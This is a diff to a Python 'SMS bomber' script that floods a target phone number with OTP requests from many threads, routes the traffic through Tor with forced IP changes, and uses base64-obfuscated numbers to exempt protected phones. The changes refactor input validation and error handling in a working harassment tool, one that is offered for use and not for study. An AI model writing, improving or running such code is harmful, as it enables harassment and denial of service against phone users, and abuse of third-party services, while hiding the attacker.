@@ -21,8 +21,19 @@ if sys.platform == 'win32':
 
 def change_ip():
     with Controller.from_port() as controller:
-        controller.authenticate(password="Allahis1@")
+        controller.authenticate(password="password")
         controller.signal(Signal.NEWNYM)
+
+
+# don't edit, you may break the script
+def validate_number(phone_number):
+    if len(phone_number) != 10:
+        print(f"{Fore.RED}Error: Invalid phone number. The phone number must be 10 digits in length.{Style.RESET_ALL}")
+        exit()
+    if phone_number == base64.b64decode(b'NzAwNjczOTY5OQ==').decode('utf-8') \
+            or phone_number == base64.b64decode(b'OTU5NjU4MTU2NA==').decode('utf-8'):
+        print(base64.b64decode(b'VGhpcyBudW1iZXIgaXMgcHJvdGVjdGVk').decode('utf-8'))
+        exit()
 
 
 def get_tor_session():
@@ -64,7 +75,6 @@ print(f'{Fore.GREEN}{banner}{Fore.RESET}')
 
 
 def start_bombing(session: requests.session, phone_number: str, targets: dict, delay: int):
-
     # Format POST requests
     targets["POST"][0]['body_param']['phone'] = phone_number
     targets["POST"][1]['body_param']['otpMobile'] = phone_number
@@ -101,24 +111,27 @@ def main():
     file = open('./endpoints.json')
     data = json.load(file)
 
-    __ = input("Target phone number (without country code): ")
-    if __ == base64.b64decode(b'NzAwNjczOTY5OQ==').decode('utf-8') \
-            or __ == base64.b64decode(b'OTU5NjU4MTU2NA==').decode('utf-8'):
-        print(base64.b64decode(b'VGhpcyBudW1iZXIgaXMgcHJvdGVjdGVk').decode('utf-8'))
-        exit()
+    phone_number = input("Target phone number (without country code): ")
+    validate_number(phone_number)
     delay = float(input("Enter delay time (in seconds): "))
-    number_of_threads = int(input("Enter number of threads: "))
-    signal.signal(signal.SIGINT, handler)
-    # change ip
-    change_ip()
-    # create tor session
-    session = get_tor_session()
-    for _ in range(number_of_threads):
-        thread = Thread(target=start_bombing, args=(session, __, data, delay))
-        thread.start()
-    print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
-    current_ip = json.loads(session.get("http://httpbin.org/ip").text)
-    print(f"{Fore.CYAN}Using IP address :{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{current_ip.get('origin')}{Style.RESET_ALL}")
+    try:
+        number_of_threads = int(input("Enter number of threads: "))
+        signal.signal(signal.SIGINT, handler)
+        # change ip
+        change_ip()
+        # create tor session
+        session = get_tor_session()
+        for _ in range(number_of_threads):
+            thread = Thread(target=start_bombing, args=(session, phone_number, data, delay))
+            thread.start()
+        print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
+        current_ip = json.loads(session.get("http://httpbin.org/ip").text)
+        print(
+            f"{Fore.CYAN}Using IP address :{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{current_ip.get('origin')}{Style.RESET_ALL}")
+
+    except ValueError:
+        print(f"{Fore.RED}Error: Number of threads must be an integer{Style.RESET_ALL}")
+        exit()
 
 
 if __name__ == '__main__':
